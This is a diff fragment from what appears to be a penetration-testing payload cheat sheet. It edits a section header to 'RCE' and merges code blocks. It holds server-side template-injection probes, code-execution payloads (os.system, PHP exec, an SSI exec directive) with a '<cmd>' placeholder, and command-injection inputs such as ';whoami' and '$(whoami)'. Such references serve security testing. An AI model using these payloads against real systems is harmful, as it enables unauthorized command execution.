@@ -101,7 +101,7 @@ ${4*4}
 <%= 4*4 %>
 ```
 
-Code Execution - Server
+#### RCE
 
 ```
 os.system('<cmd>')
@@ -111,11 +111,7 @@ echo exec("<cmd>");
 echo `<cmd>`;
 
 <!--#exec cmd="<cmd>" --> 
-```
 
-Code Execution - Machine
-
-```
 whoami
 $(whoami)
 ;whoami
